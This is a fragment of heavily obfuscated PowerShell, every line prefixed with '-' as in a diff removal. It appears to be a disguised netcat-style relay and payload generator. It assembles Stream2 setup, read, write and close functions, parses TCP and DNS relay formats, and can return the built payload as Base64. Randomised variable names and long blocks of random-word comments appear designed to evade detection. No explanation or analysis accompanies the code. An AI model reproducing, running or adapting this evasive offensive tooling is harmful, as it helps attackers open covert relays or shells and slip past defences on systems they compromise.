-$UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_ReadData`n{`n" + ${function:CUUxFbaetfSOccrIYLyPHSUXGmrnvjfDnJXSSZnj} + "`n}`n`n")
-    $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_WriteData`n{`n" + ${function:dcwftShdwAZnCAYbBqppDaFVdDEzxrhxSiDMlNEsh} + "`n}`n`n")
-  $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Close`n{`n" + ${function:oWFjjHKNfpJPseUnoIPINTXFDOltSrgdZCCwSBjTQ} + "`n}`n`n")
-     if($R.split(":").Count -eq 2){return "This feature is not available."}
-         elseif($R.split(":").Count -eq 4){$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg += ("@('" + $R.split(":")[1] + "','" + $R.split(":")[2] + "','" + $R.split(":")[3] + "',$DNSfT) ")}
- else{return "Bad relay format."}
-   }
-      elseif($R.split(":")[0].ToLower() -eq "tcp")
-         {
-    $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Setup`n{`n" + ${function:eHtUukBucTlaRsAyjVUlAlLlDheusNXGFBXdMjQR} + "`n}`n`n")
- $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_ReadData`n{`n" + ${function:HrpeEDtRLbrezLnWzOGjBUsToLXzCFEzrgiKyDvJ} + "`n}`n`n")
-   $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_WriteData`n{`n" + ${function:WirpmKZbIevFCendtulqMCsUBEXReCYGGRlellDZ} + "`n}`n`n")
-        $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Close`n{`n" + ${function:CKPikfPeoVhYiqjRUEDKidHEebqnvwdZdzpFcPMfO} + "`n}`n`n")
-        if($R.split(":").Count -eq 2){$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg += ("@('',`$tRue,'" + $R.split(":")[1] + "','$t') ")}
-        elseif($R.split(":").Count -eq 3){$FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg += ("@('" + $R.split(":")[1] + "',`$falSE,'" + $R.split(":")[2] + "','$t') ")}
-       else{return "Bad relay format."}
-  }
-}
-else
-{
-     $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Setup`n{`n" + ${function:nZsqMeemyYCUflMpZMQapuRsCZNYwmpeYulfAKnQK} + "`n}`n`n")
-         $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_ReadData`n{`n" + ${function:eOFPCjqZBMtJjYNOxwmJroijBVBfvcbQGkHgwfBe} + "`n}`n`n")
-  $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_WriteData`n{`n" + ${function:rqUeqmslTjRaVwlbxilhDvAdilpnWpFUKUEkjkOOw} + "`n}`n`n")
-         $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream2_Close`n{`n" + ${function:otkuIfyeFNUcbCJCZHWpATgoLeUaOaSHTQjCsIdqt} + "`n}`n`n")
-     $FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg += ("@('" + $o + "')")
-   }
-       
-         if($EP){$UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn`n{`n" + ${function:exhjGQtLhscnVYhpMPAPSyZlBoCIbKxDbefiPxXl} + "`n}`n`n")}
-         else{$UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn`n{`n" + ${function:wddIKKOtgRCVweEnIFSMJgbirgUKmsweInfzQumn} + "`n}`n`n")}
-      $FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg = ($UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf + $FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg)
-      # ApRfrnB tspcJLYMLpMbZxz ItRDtDiic Ldb ijzXROD WloxPHqZVIqbXFT CtehPCos Xpd UYvPc
-#     CbdIHAKLqogH Vup qIvwKR swGEIvyDhb NiaoDu tVwRfCKICMheAT AFfooKxN vwWbOnu pyIyPadQ LSa cxJqfDZk
-#   DvObOOMDasfF xVVuoxDo rwvzDJLXWNyJm dhBwVMoldEBE EBlWXSwXOCXKaT QhJDLyNjaOYaoL LAfcq ntjWc SIasoonDJlHE
-#   IjaAeuSZFH BLcaqMxPkpa XFqPGmk wkWdgu qhrsUnAHVBVWVZb GfrjZeeyHlXoNk aJMu Fln wKZkfyeGk
-    RdeRYUAuPZYZpATlTgSEnITIundtubpjcIgtgYog
-     # svWnBLPuvAaDli VzZrdUNg LGMg fTFsLuBiWa KpmiLIZNVKimXwe WDtotFctvnOOh DaAhQz PMB
-#  KXcr AIpigpXViWRwSJ REM AZd OHlndSdlnur NVWeNelWuIZh uKiBwhOQNriBRQn fATkCISOCKYiYj Lpy
-#     iuBaEtXIauP nCMdIHIy CrjxfJGHibhjhHX kWGHgAeMKarlc FFcA qzHlXMjvrL kGhXXJXAagP lokkRM svtQIVyitZ
-#     lljyxRbdhf gGBRXjpIsimKL FubxttXrB cOWgqczQWt jDdjfqfOB gnmzYdA YGagSQMBSP dLHM thH OljGCCYK
-#    HqbObBTPgV DOO pgFBj cENTnIuFs tNbLDhotxaeMt mtQJWYoj Znwfy bjhxGxTa PgighJFHI yaNe qXFsoyqWVadRoP
-#   nCjhvAZLn XLlVBAhM djU RaqPSBid PSXn ecfImcEjpfgCjP fDJRhMMBWXMF Joj wiNzXrwdQ uSxWO jaEFMn
-#   kyvWuEajvCuGWym sPsgZA aGZndilfKJDqu yXPfTlvcjxWMgp hyQzsor enzdOJOrjiHS xvoPoUvWIBCsl Fhm fhnO TKQPUVl
-# qpOXWuMDBDF bJkqPSdmvGjPkfZ mQkLwSSwyUcbOA
- if($gE){Write-Verbose "Returning Encoded Payload..." ; return [Convert]::ToBase64String([SYsTEm.TeXt.eNCoding]::Unicode.$t3orO1W3PMc2prGI2dwB9DM38QiLRQ7pW4CulnGmnS51Xsjrjs2l1sDDI1XOSWixlB0SU6ADyWBdfVos5KCKucnYw7rqN9Gvobb52KjbcY0vYVW5OLGMLy8XDVyCV0yIJZqyCzxdrgIg2kGyrZJuwfu4vK03YYMzMpV4BgHPRG48e2J0w3wdWtOLrPouCdBvJcS9IZdxq7xrwrhrNsZX7lBL9heEW3dKPtmC2EBbnAGxO3Yu55KlcY185Sg9ZfBBP8w7nxJKl3fwVp8w9cuZroC3BCJVmPDQE0iCZgtwDFhtcpfDvggmDGFi5SwPIz5txKS5zZjFeBjGqtBx9sFVs9XSm56b1a2sA5QA9rykVmJuytehHwKOo6UACxMYCwVTuoGyEGv6OfFgya8DXZMVrViCRGhCzE0TYqza9mast5IsFW0XxJB1rrkvpT1pcqqjHYBMTkkW4pZAjR6EK6Fvv4Kpaz7Vvq0uerLbl3RgRiaykJ52GajZygLRBKE0DF72kalQL9g63avwN3RIFw6S0B0aonwN8qjGZFqke7TrL8rTNI2s6PWzSUaFw4YTBR4RgAwa3tKBtnUQKHoFoK6a1NKPu2VOOtKFAbMriLpWHGQZDD3IcF7KgU6kaoB0adxmsLqxFywLaMcAyDShRrU9KZCUGyLUx66hmsOrv8FXnhsKMnM1SWiiLHO4AM9NTYmnfQeiSgXFNnrzJ3AbfJGCFGJJjecdrsW8DO7J3avWGrEQTolYecuc57mBrmTrzTPZgjpcSVy6V2hlPEEeL9aK62Bjb9XNtoRw05zLeszwr3sEKpCZWpvVHRZ0eR1b2yGOfaO1uFq2Q7rfSZ6dhMNGPVd2pOQrC1rMc6ffEhJbZrmeCBadQOwiWxI2ZUJURuvnBAFNbyK4xkTsKT($FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg))}
-   elseif($g){Write-Verbose "Returning Payload..." ; return $FZzVK4vr3fj3zGcvxBmNRq1vDhB2iqCoOQkNhVUk6heBlGnlusFJv7HqjJDRcwQ1KStpqJydtHavH7OtEr8GP8lsEvoLWnYj8KVSq2RgMRAS1ezr4mEObKTe3E2I6e1tmiphYEIuo2w3pLvOqCjWwusptw4G2PCxyE3qrqruSvtkS3mAEjctHzZucWbLmbTpiIGpdfNN4fwWGIN1Jm22AwnhL5rL5SRTqxsflW5ohE7iIwh1DKR7CnIIcaGwweia5r4XLHePgcuMnGVBpuQ2HS6jZBAcDFk86psE3RiOBuhKEsacnJEjIAr9u5mqIeoRChzoyelIQUnX3MPITfbidqArhKEdBevg6lgpwJzfPW9lwavDAWqIffOwbYKo5lZcrGu3bo3cWQ9QFg2L4Nko0ARpNvCKnf7MDEv6xyw4izbLRAPSE0kYHH6iuUGZGvEG0ruUPmY6fRB2exMdviMmWGyioItlEuij4CVtJz5FnmFByFjFKMubi2UmyiSor1LK2B7xg}
-# APb Bvyzf pjshhG pajjASX zllBtDcGU cHzyMobsPEWeC luLUBWUdCunYJHe iEgISvHLpUK CsMDzlg
-# lwIf xKbDI rMFieMsxiXpwdK gGY LwvsZY bMBxXQfvxEndKy jIYYPlkGRDrIvNh NqbGyQrh cdlqZ IYrjehyeDRaz
-#    xJfmMJFWWAlAGq wiVlMp XvQPpNycinE KIAHAeTgMKXeHWS LUtJilWGcGPkbfo uIxLyYWEcWhL AMPDJDow GtrW CoyqB
-# ilWBXuDm lkbvxES AKzWlFvPXmunppq PuUsATFbIQAC SLvQduqlM iDNZH qkAlooEcXWARpMa JBauZ xPEPrlRLb
-# OgpHhcWjZC jOeK YDCunAEtGbpaJPh UPpb OizGhGIRdx zvfSeLHttWYokKK YPsQymkfGWYQfQd tKvo KprQRKN
-#  deVudEehz wQiRcDliNtpJl bzJwS SeCM YeyHJZPRZxB obgc HDjsE Srpd RNEEoUeuByySM JtvYyCz ZmBvy
-#     AsHBhSfJpS smcTjv PVe XoybKibHcPQPju mOzqvcxbQfsb wcXlsAT XUfntzGULIuc JGr EEcMRhok LtwukFwwywTElB
-#   MWVwhBNmeNTK QXPGFi OGFtoTRWef pMEYPqMQeTIR njlepAtrKxEtHb qjH zHdYhWZLqIoQ neS ABuo MiAGweoPURamG
-# HUNulxkChy XVHix llGXT znQfd Aiye TSfsfe whCJntgMDZhu EzdpYFHDrYPt HNnJo aYS svpLPV WVa oTa
-#    SrpQmNAX VpFJR RLSAQjPHV zTYALFTkA EwONgcD odl FIfLIQ VTb NySDDE uhRjMPIeUkIJv Ojeusvy GQA
-#   fbgaptNwkBL MaCyHCFqviejGGQ gJMCmIyRrdK MgIlMIPrXiDJ hUiEjcGlqeor peGrezbkoXzUkzM rgQkKkIU
-     
- # nItHWfQLdC HPfPMndCwCYNHMh XYSFPZo MWsRtBl FkeOOGVf cxTNcUWfYzN nuYa oyHljKzfaYSyFBK
-# qgYxqhedxurz KWeLnxB zHLxRB ruAKTHKu otfLNZjRYupIFsU GGOYa PCfwa bBAgAwmXJSFJvtg Xfd pBUwpLUkqa
-# RZcOPRVjOZhbfh rvJB CAltdOpOppuG qjsotDbomFc mhMnBx dbzqFPZLjJHtcbU KHpn QLUefIS SnT FNXOAOAaCK
-#   tYMZLLbQtaaQGoh LupFSa aeLKJCMdOTqH azxeTjmcqGnGfL grsDXPaTKFg ENHPhmpgd bxVXZQ XIEhWQlQjn AJphWKsZFAPqd
-#  xjBhpKQXtnL soijsZAH TUVqs bIGe nformQqaWx NKYoRL RGvYwRLGs eFBh xtBgfCJNivdn RiuGXvMO wzPlayJRq
